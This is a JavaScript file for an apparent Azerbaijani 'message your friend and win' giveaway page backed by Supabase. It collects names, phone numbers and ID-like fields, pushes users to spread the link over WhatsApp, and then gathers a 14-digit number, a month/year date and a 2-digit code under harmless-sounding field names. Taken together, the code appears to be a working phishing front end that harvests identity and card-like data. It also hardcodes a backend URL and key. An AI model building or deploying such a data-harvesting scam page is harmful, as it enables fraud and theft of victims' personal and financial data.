/* ============================================================
   app.js — Dostuna Mesaj Yaz və Qazan
   Static site | Supabase backend
   ============================================================ */

// ───── SUPABASE CONFIG ─────
const SUPABASE_URL  = 'https://kzcbfloclpxaxdtbimjt.supabase.co';
const SUPABASE_ANON = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt6Y2JmbG9jbHB4YXhkdGJpbWp0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODY0NTAyMDUsImV4cCI6MjEwMjAyNjIwNX0.1XkgUkeRsFdkSS52n-crsH8Fz0HQGRP0-aMwpKATCrM';

// ───── SUPABASE HELPERS ─────
async function sbInsert(table, data) {
  const res = await fetch(`${SUPABASE_URL}/rest/v1/${table}`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'apikey': SUPABASE_ANON,
      'Authorization': `Bearer ${SUPABASE_ANON}`,
      'Prefer': 'return=representation'
    },
    body: JSON.stringify(data)
  });
  if (!res.ok) {
    const err = await res.json().catch(() => ({}));
    throw new Error(err.message || 'Supabase insert xətası');
  }
  return res.json();
}

// ───── STATE ─────
let currentUserId = null;
let shareUrl = window.location.href.split('?')[0].split('#')[0];

// ───── DOM REFS ─────
const screens = {
  register : document.getElementById('screen-register'),
  share    : document.getElementById('screen-share'),
  message  : document.getElementById('screen-message'),
  success  : document.getElementById('screen-success')
};

const loading = document.getElementById('loading-overlay');

// ───── SCREEN SWITCHER ─────
function showScreen(name) {
  Object.values(screens).forEach(s => s.classList.remove('active'));
  const target = screens[name];
  if (target) {
    target.classList.add('active');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }
}

// ───── LOADING ─────
function showLoading() { loading.classList.remove('hidden'); }
function hideLoading() { loading.classList.add('hidden'); }

// ───── TOAST ─────
let toastTimer = null;
function showToast(msg) {
  let toast = document.getElementById('app-toast');
  if (!toast) {
    toast = document.createElement('div');
    toast.id = 'app-toast';
    toast.className = 'toast';
    document.body.appendChild(toast);
  }
  toast.textContent = msg;
  toast.classList.add('show');
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => toast.classList.remove('show'), 2600);
}

// ───── VALIDATION HELPERS ─────
function setErr(id, msg) {
  const el = document.getElementById(id);
  if (el) el.textContent = msg;
}
function clearErrs(ids) {
  ids.forEach(id => setErr(id, ''));
}
function setInputError(inputId, hasError) {
  const el = document.getElementById(inputId);
  if (!el) return;
  if (hasError) el.classList.add('error-border');
  else el.classList.remove('error-border');
}
function setPhoneError(hasError) {
  const wrap = document.querySelector('.phone-wrap');
  if (!wrap) return;
  if (hasError) wrap.classList.add('error-border');
  else wrap.classList.remove('error-border');
}

// ───── PHONE FORMATTING ─────
const phoneInput = document.getElementById('inp-nomre');
phoneInput.addEventListener('input', function () {
  // Only digits
  let val = this.value.replace(/\D/g, '');
  // Format: XX XXX XX XX
  let formatted = '';
  if (val.length > 0)  formatted += val.substring(0, 2);
  if (val.length > 2)  formatted += ' ' + val.substring(2, 5);
  if (val.length > 5)  formatted += ' ' + val.substring(5, 7);
  if (val.length > 7)  formatted += ' ' + val.substring(7, 9);
  this.value = formatted;
});

// ───── UPPERCASE INPUTS ─────
document.querySelectorAll('.uppercase-input').forEach(inp => {
  inp.addEventListener('input', function () {
    const pos = this.selectionStart;
    this.value = this.value.toUpperCase();
    try { this.setSelectionRange(pos, pos); } catch(e) {}
  });
});

// ───── TARIX FORMAT (XX/XX) ─────
const tarixInput = document.getElementById('inp-tarix');
tarixInput.addEventListener('input', function () {
  let val = this.value.replace(/\D/g, '');
  if (val.length > 4) val = val.substring(0, 4);
  let formatted = '';
  if (val.length <= 2) {
    formatted = val;
  } else {
    formatted = val.substring(0, 2) + '/' + val.substring(2, 4);
  }
  this.value = formatted;
});

// ───── RƏQƏM — only digits ─────
const reqemInput = document.getElementById('inp-reqem');
reqemInput.addEventListener('input', function () {
  this.value = this.value.replace(/\D/g, '').substring(0, 14);
});

// ───── KOD — only digits ─────
const kodInput = document.getElementById('inp-kod');
kodInput.addEventListener('input', function () {
  this.value = this.value.replace(/\D/g, '').substring(0, 2);
});

// ───── REGISTER FORM SUBMIT ─────
document.getElementById('form-register').addEventListener('submit', async function (e) {
  e.preventDefault();

  const ad     = document.getElementById('inp-ad').value.trim();
  const soyad  = document.getElementById('inp-soyad').value.trim();
  const nomre  = document.getElementById('inp-nomre').value.trim();
  const numara = document.getElementById('inp-numara').value.trim();
  const fon    = document.getElementById('inp-fon').value.trim();

  clearErrs(['err-ad','err-soyad','err-nomre','err-numara','err-fon']);
  ['inp-ad','inp-soyad','inp-numara','inp-fon'].forEach(id => setInputError(id, false));
  setPhoneError(false);

  let valid = true;

  if (!ad) {
    setErr('err-ad', 'Ad boş ola bilməz');
    setInputError('inp-ad', true);
    valid = false;
  }
  if (!soyad) {
    setErr('err-soyad', 'Soyad boş ola bilməz');
    setInputError('inp-soyad', true);
    valid = false;
  }

  // Phone: digits only, should be 9 digits (XX XXX XX XX → 9 digits)
  const phoneDigits = nomre.replace(/\D/g, '');
  if (!nomre || phoneDigits.length !== 9) {
    setErr('err-nomre', 'Nömrə düzgün formatda deyil (+994 XX XXX XX XX)');
    setPhoneError(true);
    valid = false;
  }

  if (!numara) {
    setErr('err-numara', 'Numara boş ola bilməz');
    setInputError('inp-numara', true);
    valid = false;
  }
  if (!fon) {
    setErr('err-fon', 'Fön boş ola bilməz');
    setInputError('inp-fon', true);
    valid = false;
  }

  if (!valid) return;

  showLoading();
  document.getElementById('btn-register').disabled = true;

  try {
    const result = await sbInsert('users', {
      ad,
      soyad,
      nomre: '+994' + phoneDigits,
      numara: numara.toUpperCase(),
      fon: fon.toUpperCase()
    });

    if (result && result.length > 0) {
      currentUserId = result[0].id;
    }

    // Set share link
    document.getElementById('share-link-text').textContent = shareUrl;

    showScreen('share');
  } catch (err) {
    console.error(err);
    showToast('Xəta baş verdi: ' + (err.message || 'Bilinməyən xəta'));
  } finally {
    hideLoading();
    document.getElementById('btn-register').disabled = false;
  }
});

// ───── COPY LINK ─────
document.getElementById('btn-copy-link').addEventListener('click', function () {
  const text = document.getElementById('share-link-text').textContent;
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(text)
      .then(() => showToast('Link kopyalandı! ✅'))
      .catch(() => fallbackCopy(text));
  } else {
    fallbackCopy(text);
  }
});

function fallbackCopy(text) {
  const ta = document.createElement('textarea');
  ta.value = text;
  ta.style.position = 'fixed';
  ta.style.opacity = '0';
  document.body.appendChild(ta);
  ta.focus();
  ta.select();
  try {
    document.execCommand('copy');
    showToast('Link kopyalandı! ✅');
  } catch {
    showToast('Kopyalama alınmadı, əl ilə kopyalayın');
  }
  document.body.removeChild(ta);
}

// ───── WHATSAPP SHARE ─────
document.getElementById('btn-whatsapp').addEventListener('click', function () {
  const text = encodeURIComponent(
    '🎉 Salam! Bura qoşul və birlikdə oynayaq:\n' + shareUrl
  );
  // Opens WhatsApp contact picker so user can choose 5 contacts
  const waUrl = 'https://api.whatsapp.com/send?text=' + text;
  window.open(waUrl, '_blank', 'noopener,noreferrer');
});

// ───── GO TO MESSAGE ─────
document.getElementById('btn-go-message').addEventListener('click', function () {
  showScreen('message');
});

// ───── MESSAGE FORM SUBMIT ─────
document.getElementById('form-message').addEventListener('submit', async function (e) {
  e.preventDefault();

  const reqem = document.getElementById('inp-reqem').value.trim();
  const tarix = document.getElementById('inp-tarix').value.trim();
  const kod   = document.getElementById('inp-kod').value.trim();

  clearErrs(['err-reqem','err-tarix','err-kod']);
  ['inp-reqem','inp-tarix','inp-kod'].forEach(id => setInputError(id, false));

  let valid = true;

  if (!reqem || reqem.length !== 14) {
    setErr('err-reqem', 'Rəqəm dəqiq 14 rəqəm olmalıdır');
    setInputError('inp-reqem', true);
    valid = false;
  }

  // tarix format check: XX/XX
  const tarixRegex = /^\d{2}\/\d{2}$/;
  if (!tarix || !tarixRegex.test(tarix)) {
    setErr('err-tarix', 'Tarix XX/XX formatında olmalıdır (Ay/İl)');
    setInputError('inp-tarix', true);
    valid = false;
  }

  if (!kod || kod.length !== 2) {
    setErr('err-kod', 'Kod dəqiq 2 rəqəm olmalıdır');
    setInputError('inp-kod', true);
    valid = false;
  }

  if (!valid) return;

  showLoading();
  document.getElementById('btn-send').disabled = true;

  try {
    await sbInsert('messages', {
      user_id        : currentUserId || null,
      reqem,
      qosulma_tarixi : tarix,
      kod
    });

    // Clear form
    document.getElementById('inp-reqem').value = '';
    document.getElementById('inp-tarix').value = '';
    document.getElementById('inp-kod').value   = '';

    showScreen('success');
  } catch (err) {
    console.error(err);
    showToast('Xəta baş verdi: ' + (err.message || 'Bilinməyən xəta'));
  } finally {
    hideLoading();
    document.getElementById('btn-send').disabled = false;
  }
});

// ───── NEW MESSAGE ─────
document.getElementById('btn-new-message').addEventListener('click', function () {
  showScreen('message');
});

// ───── INITIAL SCREEN ─────
showScreen('register');
